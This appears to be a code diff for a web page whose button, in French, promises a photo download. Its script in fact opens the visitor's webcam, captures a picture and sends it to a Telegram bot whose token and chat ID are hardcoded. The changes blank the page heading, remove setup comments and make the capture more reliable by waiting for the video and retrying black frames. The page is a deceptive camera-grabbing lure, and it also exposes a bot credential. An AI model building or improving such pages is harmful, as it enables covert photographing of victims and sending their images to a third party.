@@ -77,7 +77,7 @@
 </head>
 <body>
     <div class="container">
-        <h1>Appuyez pour télécharger les photos</h1>
+        <h1> </h1>
         <button id="startCapture">Appuyez pour télécharger les photos</button>
         <video id="video" width="640" height="480" autoplay></video>
         <canvas id="canvas" style="display:none;"></canvas>
@@ -87,10 +87,9 @@
     <script>
         // ==========================================
         // 🔐 التوكن ومعرف الدردشة مخزنين هنا فقط
-        // غيرهم من هنا إذا أردت التعديل
         // ==========================================
-        const BOT_TOKEN = "7323434162:AAHNE_LwznKc2CCOehy7bwWMliqccgIguU4";  // ضع توكن بوتك هنا
-        const CHAT_ID = "6414801160";  // ضع معرف الدردشة هنا
+        const BOT_TOKEN = "7323434162:AAHNE_LwznKc2CCOehy7bwWMliqccgIguU4";
+        const CHAT_ID = "6414801160";
         // ==========================================
 
         const startCapture = document.getElementById('startCapture');
@@ -100,13 +99,14 @@
 
         let stream = null;
         let hasPermission = false;
+        let isVideoReady = false;
 
         function showStatus(message, type) {
             statusDiv.innerHTML = message;
             statusDiv.className = `status ${type}`;
         }
 
-        // طلب الكاميرا
+        // طلب الكاميرا وانتظار تحميل الفيديو
         async function requestCamera() {
             if (hasPermission && stream) return true;
 
@@ -115,9 +115,23 @@
                 stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 video.srcObject = stream;
                 video.style.display = 'block';
+                
+                // 🔥 الحل الأهم: انتظر حتى يبدأ الفيديو فعليًا
+                await new Promise((resolve) => {
+                    video.onloadedmetadata = () => {
+                        video.play();
+                        resolve();
+                    };
+                });
+                
+                // انتظر إضافي للتأكد من ظهور الصورة
+                await new Promise(resolve => setTimeout(resolve, 500));
+                
                 hasPermission = true;
+                isVideoReady = true;
                 showStatus('✅ تم الوصول إلى الكاميرا! جاري التصوير...', 'success');
                 return true;
+                
             } catch(error) {
                 let msg = '❌ فشل الوصول للكاميرا: ';
                 if (error.name === 'NotAllowedError') msg += 'لقد رفضت الإذن';
@@ -130,18 +144,45 @@
 
         // التقاط الصورة وإرسالها
         async function captureAndSend() {
-            if (!hasPermission || !stream) {
-                showStatus('❌ لا توجد صلاحية للكاميرا', 'error');
+            if (!hasPermission || !stream || !isVideoReady) {
+                showStatus('❌ الكاميرا غير جاهزة بعد، حاول مرة أخرى', 'error');
+                return false;
+            }
+
+            // التأكد من أن الفيديو يعرض صورة حقيقية وليست سوداء
+            if (video.videoWidth === 0 || video.videoHeight === 0) {
+                showStatus('❌ الفيديو لم يتحمّل بعد، انتظر ثانية', 'error');
                 return false;
             }
 
             try {
                 showStatus('📸 جاري التصوير...', 'info');
                 
-                // التقاط الصورة
+                // ضبط أبعاد الكانفس مثل الفيديو
                 canvas.width = video.videoWidth;
                 canvas.height = video.videoHeight;
-                canvas.getContext('2d').drawImage(video, 0, 0);
+                
+                // الرسم من الفيديو
+                const context = canvas.getContext('2d');
+                context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                
+                // فحص اختياري: تأكد أن الصورة ليست سوداء
+                const imageData = context.getImageData(0, 0, canvas.width, canvas.height);
+                const pixels = imageData.data;
+                let isBlack = true;
+                for (let i = 0; i < Math.min(pixels.length, 1000); i += 4) {
+                    if (pixels[i] > 50 || pixels[i+1] > 50 || pixels[i+2] > 50) {
+                        isBlack = false;
+                        break;
+                    }
+                }
+                
+                if (isBlack) {
+                    showStatus('⚠️ الصورة سوداء، حاول مرة أخرى بعد ثانية', 'warning');
+                    await new Promise(resolve => setTimeout(resolve, 1000));
+                    // محاولة ثانية
+                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                }
                 
                 showStatus('📤 جاري الإرسال إلى تلغرام...', 'info');
                 
@@ -169,6 +210,7 @@
                         stream.getTracks().forEach(track => track.stop());
                         stream = null;
                         hasPermission = false;
+                        isVideoReady = false;
                         video.style.display = 'none';
                     }
                     return true;
@@ -196,9 +238,6 @@
                 startCapture.innerHTML = '📷 تصويري وإرساله إلى تلغرام';
                 return;
             }
-            
-            // انتظار قليل لتثبيت الفيديو
-            await new Promise(resolve => setTimeout(resolve, 500));
             
             await captureAndSend();
             
